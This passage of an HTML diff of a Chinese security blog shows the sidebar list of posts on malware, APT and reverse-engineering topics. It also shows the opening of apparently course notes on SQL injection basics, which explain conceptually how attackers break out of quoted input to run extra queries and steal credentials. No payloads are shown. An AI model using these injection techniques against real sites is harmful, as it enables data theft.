+            <span class="post-date" title="2022-11-19 22:31:27">2022/11/19</span>
+        </a>
+        
+        
+        <a  class="All win内核 "
+           href="/2022/11/19/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="进程和线程">进程和线程</span>
+            <span class="post-date" title="2022-11-19 20:42:28">2022/11/19</span>
+        </a>
+        
+        
+        <a  class="All win内核 "
+           href="/2022/11/15/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="保护模式">保护模式</span>
+            <span class="post-date" title="2022-11-15 15:35:26">2022/11/15</span>
+        </a>
+        
+        
+        <a  class="All win内核 "
+           href="/2022/11/14/winX86%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="winX86内核驱动开发">winX86内核驱动开发</span>
+            <span class="post-date" title="2022-11-14 16:22:58">2022/11/14</span>
+        </a>
+        
+        
+        <a  class="All win内核 "
+           href="/2022/11/13/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="内核环境搭建学习">内核环境搭建学习</span>
+            <span class="post-date" title="2022-11-13 15:05:11">2022/11/13</span>
+        </a>
+        
+        
+        <a  class="All 游戏逆向 "
+           href="/2022/11/07/%E7%83%AD%E8%A1%80%E6%B1%9F%E6%B9%96%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AD%91%E5%9F%BA/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="热血江湖游戏安全筑基">热血江湖游戏安全筑基</span>
+            <span class="post-date" title="2022-11-07 21:27:59">2022/11/07</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 入门手册 "
+           href="/2022/09/29/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8BAPK%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="APK反破解技术">APK反破解技术</span>
+            <span class="post-date" title="2022-09-29 16:55:42">2022/09/29</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 "
+           href="/2022/09/29/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8BXposed%E6%A1%86%E6%9E%B6/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="安卓逆向之Xposed框架">安卓逆向之Xposed框架</span>
+            <span class="post-date" title="2022-09-29 14:53:11">2022/09/29</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 入门手册 "
+           href="/2022/09/29/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8BNDK%E5%BC%80%E5%8F%91/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NDK开发">NDK开发</span>
+            <span class="post-date" title="2022-09-29 14:42:34">2022/09/29</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 "
+           href="/2022/09/27/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%E4%BF%AE%E6%94%B9%E8%B5%84%E6%BA%90%E5%8E%BB%E5%B9%BF%E5%91%8A01/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="安卓逆向实战修改资源去广告01">安卓逆向实战修改资源去广告01</span>
+            <span class="post-date" title="2022-09-27 19:46:34">2022/09/27</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 入门手册 "
+           href="/2022/09/26/%E9%80%9A%E8%BF%87%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0smali%E6%B1%87%E7%BC%96/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="smali与dalvik指令">smali与dalvik指令</span>
+            <span class="post-date" title="2022-09-26 15:50:15">2022/09/26</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 入门手册 "
+           href="/2022/09/23/%E5%9F%BA%E4%BA%8EAndroid%E7%9A%84ARM%E6%B1%87%E7%BC%96/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基于Android的ARM汇编">基于Android的ARM汇编</span>
+            <span class="post-date" title="2022-09-23 15:17:52">2022/09/23</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 入门手册 "
+           href="/2022/09/21/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8BAPK%E6%89%93%E5%8C%85%E6%B5%81%E7%A8%8B/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="安卓逆向之APK打包流程">安卓逆向之APK打包流程</span>
+            <span class="post-date" title="2022-09-21 10:17:44">2022/09/21</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 入门手册 "
+           href="/2022/09/19/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8B%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="安卓逆向之安卓开发">安卓逆向之安卓开发</span>
+            <span class="post-date" title="2022-09-19 17:18:12">2022/09/19</span>
+        </a>
+        
+        
+        <a  class="All 安卓逆向 入门手册 "
+           href="/2022/09/16/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B9%8Bjava%E5%9F%BA%E7%A1%80/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="安卓逆向之java基础">安卓逆向之java基础</span>
+            <span class="post-date" title="2022-09-16 18:02:04">2022/09/16</span>
+        </a>
+        
+        
+        <a  class="All IOT "
+           href="/2022/09/01/IOT%E5%88%9D%E6%8E%A2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="iot初探">iot初探</span>
+            <span class="post-date" title="2022-09-01 14:51:06">2022/09/01</span>
+        </a>
+        
+        
+        <a  class="All 漏洞研究 漏洞相关知识 "
+           href="/2022/09/01/win%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="漏洞利用原理">漏洞利用原理</span>
+            <span class="post-date" title="2022-09-01 11:16:25">2022/09/01</span>
+        </a>
+        
+        
+        <a  class="All 漏洞研究 "
+           href="/2022/08/31/CVE-2010-2883%E5%A4%8D%E7%8E%B0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CVE-2010-2883_Adobe Reader TTF字体SING表栈溢出漏洞复现">CVE-2010-2883_Adobe Reader TTF字体SING表栈溢出漏洞复现</span>
+            <span class="post-date" title="2022-08-31 17:35:30">2022/08/31</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2022/08/23/APT_Shamoon/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="关于Shamoon.APT组织的一次完整攻击链分析">关于Shamoon.APT组织的一次完整攻击链分析</span>
+            <span class="post-date" title="2022-08-23 10:12:17">2022/08/23</span>
+        </a>
+        
+        
+        <a  class="All 应急响应 "
+           href="/2022/08/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="日志分析">日志分析</span>
+            <span class="post-date" title="2022-08-16 17:04:55">2022/08/16</span>
+        </a>
+        
+        
+        <a  class="All 应急响应 "
+           href="/2022/08/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94everything%E6%96%87%E4%BB%B6%E8%BF%87%E6%BB%A4/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="everything文件过滤">everything文件过滤</span>
+            <span class="post-date" title="2022-08-16 16:22:03">2022/08/16</span>
+        </a>
+        
+        
+        <a  class="All APT研究 APT-C-26（Lazarus） "
+           href="/2022/08/12/Lazarus%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E8%88%AA%E7%A9%BA%E8%88%AA%E5%A4%A9%E8%A1%8C%E4%B8%9A%E7%9A%84%E6%94%BB%E5%87%BB/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Lazarus一次针对航空航天行业的攻击">Lazarus一次针对航空航天行业的攻击</span>
+            <span class="post-date" title="2022-08-12 15:02:59">2022/08/12</span>
+        </a>
+        
+        
+        <a  class="All APT研究 APT-C-08(蔓灵花) "
+           href="/2022/08/11/BITTER%E7%BB%84%E7%BB%87%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="BITTER组织样本分析1">BITTER组织样本分析1</span>
+            <span class="post-date" title="2022-08-11 16:06:21">2022/08/11</span>
+        </a>
+        
+        
+        <a  class="All 技术研究 "
+           href="/2022/07/19/%E7%88%AC%E8%99%AB/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="爬虫">爬虫</span>
+            <span class="post-date" title="2022-07-19 16:12:19">2022/07/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2022/07/15/Google_Hacking_%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Google_Hacking_谷歌搜索引擎">Google_Hacking_谷歌搜索引擎</span>
+            <span class="post-date" title="2022-07-15 09:56:40">2022/07/15</span>
+        </a>
+        
+        
+        <a  class="All 恶意代码分析 "
+           href="/2022/07/13/2022-7-13-exe/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="个人简历.exe">个人简历.exe</span>
+            <span class="post-date" title="2022-07-13 09:12:38">2022/07/13</span>
+        </a>
+        
+        
+        <a  class="All 技术研究 "
+           href="/2022/07/06/%E5%88%9D%E5%85%A5Yara/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Yara入门">Yara入门</span>
+            <span class="post-date" title="2022-07-06 16:14:17">2022/07/06</span>
+        </a>
+        
+        
+        <a  class="All 恶意代码分析 蠕虫 "
+           href="/2022/06/28/2022-06-25_Scar%E6%84%9F%E6%9F%93%E5%BC%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="2022.06.25_Scar感染式样本分析">2022.06.25_Scar感染式样本分析</span>
+            <span class="post-date" title="2022-06-28 09:25:02">2022/06/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2022/06/27/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="应急响应手册">应急响应手册</span>
+            <span class="post-date" title="2022-06-27 15:20:12">2022/06/27</span>
+        </a>
+        
+        
+        <a  class="All 恶意代码分析 "
+           href="/2022/03/08/%E5%AE%8F%E7%97%85%E6%AF%92%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="宏病毒基础入门">宏病毒基础入门</span>
+            <span class="post-date" title="2022-03-08 09:23:03">2022/03/08</span>
+        </a>
+        
+        
+        <a  class="All 恶意代码分析 勒索病毒 "
+           href="/2022/03/07/WannaCry%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="WannaCry病毒分析">WannaCry病毒分析</span>
+            <span class="post-date" title="2022-03-07 11:40:13">2022/03/07</span>
+        </a>
+        
+        
+        <a  class="All 技术研究 "
+           href="/2022/03/03/wireshark/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="wireshark">wireshark</span>
+            <span class="post-date" title="2022-03-03 12:18:53">2022/03/03</span>
+        </a>
+        
+        
+        <a  class="All APT研究 APT-C-23(双尾蝎) "
+           href="/2022/02/27/%E5%8F%8C%E5%B0%BE%E8%9D%8E%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="APT-C-23境外双尾蝎组织样本分析">APT-C-23境外双尾蝎组织样本分析</span>
+            <span class="post-date" title="2022-02-27 16:00:07">2022/02/27</span>
+        </a>
+        
+        
+        <a  class="All 应急响应 "
+           href="/2022/02/24/%E8%AE%B0%E5%BD%95%E6%A0%A1%E5%9B%ADMAC%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="记录校园MAC挖矿病毒">记录校园MAC挖矿病毒</span>
+            <span class="post-date" title="2022-02-24 20:04:18">2022/02/24</span>
+        </a>
+        
+        
+        <a  class="All 恶意代码分析 蠕虫 "
+           href="/2022/02/24/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="熊猫烧香分析">熊猫烧香分析</span>
+            <span class="post-date" title="2022-02-24 18:09:42">2022/02/24</span>
+        </a>
+        
+        
+        <a  class="All win内核 "
+           href="/2022/02/20/win%E5%86%85%E6%A0%B8%E4%B8%8E%E9%A9%B1%E5%8A%A8/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="win内核与驱动">win内核与驱动</span>
+            <span class="post-date" title="2022-02-20 08:23:51">2022/02/20</span>
+        </a>
+        
+        
+        <a  class="All 技术研究 "
+           href="/2022/01/28/PE/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="PE">PE</span>
+            <span class="post-date" title="2022-01-28 21:26:29">2022/01/28</span>
+        </a>
+        
+        
+        <a  class="All 技术研究 "
+           href="/2021/04/10/unix%E7%8E%AF%E5%A2%83%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="unix环境高级编程">unix环境高级编程</span>
+            <span class="post-date" title="2021-04-10 14:54:25">2021/04/10</span>
+        </a>
+        
+        
+        <a  class="All 技术研究 "
+           href="/2021/03/29/codeql%E5%88%9D%E5%85%A5/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="codeql初入">codeql初入</span>
+            <span class="post-date" title="2021-03-29 14:14:01">2021/03/29</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-htb学院sql注入基础" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">htb学院htb学院sql注入基础</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-10-27 10:58:40'>2023-06-28 16:11</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5-SQLi"><span class="toc-text">SQL 注入 (SQLi)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E4%BE%8B%E5%92%8C%E5%BD%B1%E5%93%8D"><span class="toc-text">用例和影响</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E9%98%B2"><span class="toc-text">预防</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%80%E4%BB%8B"><span class="toc-text">数据库简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-text">数据库管理系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-text">结构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-text">数据库类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">关系数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">非关系数据库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-%E7%AE%80%E4%BB%8B"><span class="toc-text">MySQL 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E5%8C%96%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80-SQL"><span class="toc-text">结构化查询语言 (SQL)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C"><span class="toc-text">命令行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">创建数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A8"><span class="toc-text">表</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E6%A0%BC%E5%B1%9E%E6%80%A7"><span class="toc-text">表格属性</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-text">练习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5"><span class="toc-text">SQL语句</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-text">插入语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E8%AF%AD%E5%8F%A5"><span class="toc-text">选择语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%A3%B0%E6%98%8E"><span class="toc-text">删除声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E5%8F%98%E5%A3%B0%E6%98%8E"><span class="toc-text">改变声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E5%A3%B0%E6%98%8E"><span class="toc-text">更新声明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C"><span class="toc-text">查询结果</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E5%BA%8F%E7%BB%93%E6%9E%9C"><span class="toc-text">排序结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E7%BB%93%E6%9E%9C"><span class="toc-text">限制结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WHERE-%E5%AD%90%E5%8F%A5"><span class="toc-text">WHERE 子句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%96%9C%E6%AC%A2%E6%9D%A1%E6%AC%BE"><span class="toc-text">喜欢条款</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">SQL 运算符</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AND%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">AND运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%96%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">或运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">非运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">符号运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E4%B8%AD%E7%9A%84%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">查询中的运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AA%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-text">多个运算符优先级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B"><span class="toc-text">SQL 注入简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-Web-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E4%BD%BF%E7%94%A8-SQL"><span class="toc-text">在 Web 应用程序中使用 SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-text">什么是注入？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF"><span class="toc-text">语法错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">SQL注入的类型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%A0%E8%A6%86%E6%9F%A5%E8%AF%A2%E9%80%BB%E8%BE%91"><span class="toc-text">颠覆查询逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-text">身份验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLi-%E5%8F%91%E7%8E%B0"><span class="toc-text">SQLi 发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%96%E6%B3%A8%E5%B0%84"><span class="toc-text">或注射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-OR-%E8%BF%90%E7%AE%97%E7%AC%A6%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-text">使用 OR 运算符绕过身份验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-1"><span class="toc-text">练习</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A"><span class="toc-text">使用注释</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-text">注释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E6%9C%89%E6%B3%A8%E9%87%8A%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-text">带有注释的身份验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-text">另一个例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-2"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Union-Clause"><span class="toc-text">Union Clause</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union"><span class="toc-text">Union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Even-Columns"><span class="toc-text">Even Columns</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Un-even-Columns"><span class="toc-text">Un-even Columns</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Union-Injection"><span class="toc-text">Union Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E5%88%97%E6%95%B0"><span class="toc-text">检测列数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%B0%84%E4%BD%8D%E7%BD%AE"><span class="toc-text">注射位置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE"><span class="toc-text">数据库枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">MySQL 指纹识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#INFORMATION-SCHEMA-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">INFORMATION_SCHEMA 数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E5%BC%8F"><span class="toc-text">图式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A8%E6%A0%BC"><span class="toc-text">表格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97"><span class="toc-text">列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE"><span class="toc-text">数据</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-6 i,
+    .toc-level-6 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​	大多数现代 Web 应用程序在后端使用数据库结构。此类数据库用于存储和检索与 Web 应用程序相关的数据，从实际 Web 内容到用户信息和内容等。</p>
+<p>为了使 Web 应用程序动态化，Web 应用程序必须与数据库实时交互。当来自用户的 HTTP(S) 请求到达时，Web 应用程序的后端将向数据库发出查询以构建响应。</p>
+<p>这些查询可以包括来自 HTTP(S) 请求的信息或其他相关信息。</p>
+<p><img src="/htb%E5%AD%A6%E9%99%A2sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%5C1.png"></p>
+<p>​	当用户提供的信息用于构造对数据库的查询时，恶意用户可以诱使查询用于原始程序员预期之外的其他用途，从而使用称为 SQL 注入的攻击为用户提供查询数据库的权限（ SQLi).</p>
+<p>SQL 注入是指针对关系数据库的攻击，例如<code>MySQL</code>（而非关系数据库的注入，例如 MongoDB，是 NoSQL 注入）</p>
+<p>本模块将重点<code>MySQL</code>介绍 SQL 注入概念。</p>
+<h2 id="SQL-注入-SQLi"><a href="#SQL-注入-SQLi" class="headerlink" title="SQL 注入 (SQLi)"></a>SQL 注入 (SQLi)</h2><p>Web 应用程序中可能存在许多类型的注入漏洞，例如 HTTP 注入、代码注入和命令注入。</p>
+<p>然而，最常见的例子是 SQL 注入。</p>
+<p>​	当恶意用户试图传递更改 Web 应用程序发送到数据库的最终 SQL 查询的输入时，就会发生 SQL 注入，从而使用户能够直接对数据库执行其他意外的 SQL 查询。</p>
+<p>​	有很多方法可以做到这一点。要使 SQL 注入发挥作用，攻击者必须首先注入 SQL 代码，然后通过更改原始查询或执行全新的查询来颠覆 Web 应用程序逻辑。</p>
+<p>​	首先，攻击者必须在预期的用户输入限制之外注入代码，因此它不会作为简单的用户输入来执行。在最基本的情况下，这是通过注入单引号 ( <code>&#39;</code>) 或双引号 ( <code>&quot;</code>) 来避开用户输入的限制并将数据直接注入 SQL 查询来完成的。</p>
+<p>​	一旦攻击者可以注入，他们就必须寻找一种方法来执行不同的 SQL 查询。这可以通过使用 SQL 代码来组成一个工作查询来完成，该查询可以同时执行预期的 SQL 查询和新的 SQL 查询。</p>
+<p>​	有很多方法可以实现这一点，例如使用<a target="_blank" rel="noopener" href="https://www.sqlinjection.net/stacked-queries/">堆叠</a>查询或使用<a target="_blank" rel="noopener" href="https://www.mysqltutorial.org/sql-union-mysql.aspx/">联合</a>查询。最后，要检索新查询的输出，我们必须在 Web 应用程序的前端对其进行解释或捕获。</p>
+<h2 id="用例和影响"><a href="#用例和影响" class="headerlink" title="用例和影响"></a>用例和影响</h2><p>SQL 注入可能会产生巨大的影响，尤其是在后端服务器和数据库的权限非常松懈的情况下。</p>
+<p>首先，我们可能会检索我们不应该看到的秘密&#x2F;敏感信息，例如用户登录名和密码或信用卡信息，然后可以将其用于其他恶意目的。SQL 注入导致许多网站密码和数据泄露，这些网站随后被重新用于窃取用户帐户、访问其他服务或执行其他恶意操作。</p>
